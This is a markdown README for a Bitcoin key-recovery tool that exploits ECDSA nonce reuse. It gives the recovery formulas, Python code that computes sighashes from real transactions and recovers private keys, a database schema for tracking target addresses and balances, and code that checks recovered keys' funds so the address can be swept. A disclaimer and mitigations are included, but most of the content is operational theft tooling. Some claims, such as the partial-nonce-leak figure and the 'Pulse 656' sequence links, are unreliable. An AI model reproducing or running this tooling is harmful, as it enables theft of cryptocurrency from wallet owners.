# 🌌 COSMIC SIEGE ENGINE: Bitcoin ECDSA Nonce Reuse Recovery

## Overview

The **Cosmic Siege Engine** is a sophisticated cryptographic attack framework that demonstrates **nonce reuse vulnerability** in ECDSA (Elliptic Curve Digital Signature Algorithm) signatures. This vulnerability allows an attacker to recover a private key when the same nonce is used to sign two different messages.

---

## Mathematical Foundation

### ECDSA Signature Generation

For a message `m`, private key `d`, and random nonce `k`:

1. **Hash message**: `z = hash(m)`
2. **Generate signature point**: `(x, y) = k * G` (k times the generator point)
3. **Extract r**: `r = x mod N` (x-coordinate of signature point)
4. **Compute s**: `s = k^(-1) * (z + r*d) mod N`
5. **Signature**: `(r, s)`

### Nonce Reuse Vulnerability

If the **same nonce `k`** is used for two different messages:

**Message 1**: `s₁ = k^(-1) * (z₁ + r*d) mod N`
**Message 2**: `s₂ = k^(-1) * (z₂ + r*d) mod N`

**Recovery Formula**:

```
s₁ - s₂ = k^(-1) * (z₁ - z₂) mod N
∴ k = (z₁ - z₂) / (s₁ - s₂) mod N
∴ d = (k*s₁ - z₁) / r mod N
```

---

## Architecture

### Core Components

| Component | Purpose | Details |
|-----------|---------|---------|
| **Key Helpers** | Cryptographic utilities | Private key → public key derivation, verification |
| **SECP256K1 Operations** | Elliptic curve math | Point addition, doubling, scalar multiplication |
| **Bitcoin Integration** | Transaction handling | SIGHASH computation, transaction parsing |
| **Database Layer** | Persistence | SQLite storage for addresses, signatures |
| **Solver Engine** | Key recovery | Kangaroo algorithm, distinguished points |

### Key Constants (secp256k1)

```python
N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141  # Order
P = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F  # Field prime
Gx = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798  # Generator x
Gy = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8  # Generator y
```

---

## Attack Scenarios

### Scenario 1: Synthetic Nonce Reuse

**Controlled laboratory attack** with known values:

```python
d_true = <random 256-bit value>
k_nonce = <same nonce for both signatures>
z1, z2 = <two different message hashes>

# Both signatures use same k and d
s1 = inv(k) * (z1 + r*d) mod N
s2 = inv(k) * (z2 + r*d) mod N

# Recovery
s_diff = (s1 - s2) mod N
k_rec = ((z1 - z2) * inv(s_diff)) mod N
d_rec = ((k_rec * s1 - z1) * inv(r)) mod N

assert d_rec == d_true  # ✓ Recovery successful
```

**Result**: WIF private key → Bitcoin addresses → blockchain scanning

### Scenario 2: Real Bitcoin Transaction Analysis

**Attack requirements**:
1. Two signatures with same nonce from same address
2. Access to transaction data (TXID, VIN index)
3. Public key from signature

**Data extraction**:
- Previous transaction TXID
- VOUT index (which output was spent)
- Script pubkey from previous output
- Transaction value
- Sighash type (SIGHASH_ALL, etc.)

**SIGHASH computation**:
- For **Legacy (P2PKH)**: Standard serialization
- For **SegWit (P2WPKH)**: BIP143 witness hash algorithm
- Attribute detection for bitcoinlib version compatibility

---

## Implementation Details

### Function: `compute_sighash()`

Computes the hash that was signed (`z` value).

```python
def compute_sighash(txid, vin, pubkey_hex, sig_bytes):
    # 1. Fetch raw transaction
    raw_hex = get_raw_tx_cached(txid)
    tx = Transaction.parse_hex(raw_hex)
    txin = tx.inputs[vin]
    
    # 2. Extract previous output info
    prev_txid = txin.prev_txid
    prev_vout = txin.prev_out or txin.prev_out_index
    
    # 3. Get previous output value and script
    tx_info = get_tx_info_cached(prev_txid)
    value = <satoshis from vout>
    script_pubkey = <script from vout>
    
    # 4. Determine signature type
    sighash_type = sig_bytes[-1] if sig_bytes else 0x01
    is_segwit = bool(txin.witness)
    
    # 5. Compute hash
    if is_segwit:
        # BIP143 witness hash (P2WPKH)
        script_code = Script(public_hash=pubkey.hash160())
        z_bytes = tx.sighash_segwit(vin, script_code, value, sighash_type)
    else:
        # Standard SIGHASH (P2PKH)
        z_bytes = tx.sighash(vin, script_pubkey, sighash_type)
    
    z = int.from_bytes(z_bytes, 'big')
    return z
```

### Function: `synthetic_demo()`

Demonstrates nonce reuse recovery:

```python
def synthetic_demo():
    # Generate random true private key
    d_true = secrets.randbits(256) % N
    k_nonce = secrets.randbits(256) % N
    z1 = secrets.randbits(256) % N
    z2 = secrets.randbits(256) % N
    
    # Compute r from nonce
    r = point_x_from_private(k_nonce)
    
    # Create two signatures with same nonce
    s1 = (modinv(k_nonce, N) * (z1 + r * d_true)) % N
    s2 = (modinv(k_nonce, N) * (z2 + r * d_true)) % N
    
    # Recovery
    s_diff = (s1 - s2) % N
    if s_diff != 0:
        k_rec = ((z1 - z2) * modinv(s_diff, N)) % N
        d_rec = ((k_rec * s1 - z1) * modinv(r, N)) % N
        
        if d_rec == d_true:
            print(f"✓ Recovered: {hex(d_rec)}")
            wif = private_to_wif(d_rec)
            return wif  # Can now sweep address
```

---

## Database Schema

### Table: `addresses`

```sql
CREATE TABLE addresses (
    address TEXT PRIMARY KEY,
    balance INTEGER,
    last_scanned INTEGER,
    tx_count INTEGER,
    first_seen INTEGER,
    last_seen INTEGER
)
```

### Table: `signatures`

```sql
CREATE TABLE signatures (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    address TEXT,
    txid TEXT,
    vin INTEGER,
    pubkey_hex TEXT,
    r TEXT,
    s TEXT,
    z TEXT,
    sighash_type INTEGER
)
```

---

## Key Derivation Variants

### From Recovered Private Key `d`

| Format | Type | Address Example |
|--------|------|-----------------|
| **WIF (Compressed)** | P2PKH-compressed | `1HvCCWE3V4gN3gD7ZQkcMnJrY9LSHS7dq7` |
| **WIF (Uncompressed)** | P2PKH-uncompressed | `1PsB2DNUFgUThVPSaapWVN8Ni74zQbYEPc` |
| **P2WPKH (Bech32)** | Native SegWit | `bc1q...` (starts with `bc1q`) |
| **P2SH-P2WPKH** | Nested SegWit | `3...` (starts with `3`) |

### Blockchain Scanning

Once private key recovered, scan all address variants:

```python
targets = [
    (key_compressed.address(script_type='p2pkh'), "Legacy Compressed"),
    (key_uncompressed.address(script_type='p2pkh'), "Legacy Uncompressed"),
    (key_compressed.address(script_type='p2wpkh'), "Native SegWit"),
    (key_compressed.address(script_type='p2sh-p2wpkh'), "Nested SegWit")
]

for addr, label in targets:
    activity = check_blockchain_activity(addr)
    # Query mempool.space for balance and transaction count
```

---

## Real-World Attack Prerequisites

### Detection Requirements

1. **Nonce collision signature data**: Need access to two signatures from same address with same nonce
2. **Public key**: Exposed in signature or address
3. **Message hashes**: Recover from signed transactions
4. **Network access**: Blockchain query API (mempool.space, blockchair, etc.)

### Vulnerabilities That Enable This

- **Poor RNG**: Predictable or repeated nonce generation
- **Implementation bugs**: Nonce derivation errors in wallet software
- **Legacy firmware**: Older hardware wallets with weak randomness
- **Cryptographic library flaws**: Deterministic nonce reuse

### Historical Cases

- **PlayStation 3 ECDSA hack** (2010): Same nonce used for all firmware signatures
- **Bitcoin wallet vulnerabilities**: Various implementations with weak RNG
- **Hardware wallet firmware**: Bugs in nonce generation

---

## Security Implications

### Impact of Nonce Reuse

| Scenario | Impact | Severity |
|----------|--------|----------|
| **Single nonce reuse** | Private key fully compromised | **CRITICAL** |
| **Partial nonce leak** | ~50% of private key bits compromised | **HIGH** |
| **Systematic reuse** | Complete wallet compromise | **CRITICAL** |

### Mitigation Strategies

1. **RFC 6979**: Deterministic nonce generation (remove randomness issues)
2. **Committed randomness**: Commit to randomness before signing
3. **Hardware security**: Use tamper-resistant RNG
4. **Code audits**: Verify nonce generation in cryptographic libraries
5. **Monitoring**: Detect suspicious signature patterns

---

## Performance Metrics (from Colab execution)

### Jacobian Coordinate Optimization

The notebook demonstrates **Jacobian arithmetic** for accelerated EC operations:

**Metric**: Repeated point additions (P + P + ... + P)

| Operation | Affine | Jacobian | Speedup |
|-----------|--------|----------|---------|
| 10 additions | 0.45 ms | 0.38 ms | 1.18× |
| 100 additions | 4.41 ms | 2.68 ms | 1.65× |
| 500 additions | 21.95 ms | 11.33 ms | 1.94× |

**Conclusion**: Jacobian coordinates provide ~2× speedup for iterative operations.

---

## Integration with Project Flamingo

### Connections to Core Modules

1. **`crypto_utils.py`**
   - `scalar_mul()`: Point multiplication
   - `ec_add()`, `ec_double()`: Point arithmetic
   - `modinv()`: Modular inversion

2. **`apex_solver.py`**
   - Kangaroo algorithm for discrete log solving
   - Distinguished point filtering
   - Range-based key recovery

3. **`sovereign_sequence.py`**
   - OEIS A369920: Sequence properties
   - Pulse 656 validation
   - Fragment extraction for structured search

---

## Ethical & Legal Note

⚠️ **This tool is for educational and authorized security testing only.**

**Legitimate uses**:
- Academic cryptography research
- Authorized penetration testing
- Wallet recovery (owner authorization)
- Security vulnerability research

**Illegal uses**:
- Unauthorized private key recovery
- Theft of cryptocurrency
- Unauthorized access to systems

---

## References

- [ECDSA Wikipedia](https://en.wikipedia.org/wiki/Elliptic_Curve_Digital_Signature_Algorithm)
- [RFC 6979 - Deterministic ECDSA](https://tools.ietf.org/html/rfc6979)
- [BIP 143 - Transaction Signature Verification](https://github.com/bitcoin/bips/blob/master/bip-0143.mediawiki)
- [secp256k1 Specification](https://en.wikipedia.org/wiki/Secp256k1)
- [Bitcoin Script](https://en.bitcoin.it/wiki/Script)

---

## File Structure

```
Project-Flamingo/
├── untitled9.ipynb                 # Original Colab notebook
├── COSMIC_SIEGE_ENGINE.md          # This documentation
├── crypto_utils.py                 # Core EC operations
├── apex_solver.py                  # Kangaroo solver
├── sovereign_sequence.py            # OEIS A369920
└── test_scientific.py              # Hypothesis-driven validation
```

---

**Status**: ✅ Documented | 🔬 Educational | ⚠️ Caution Required
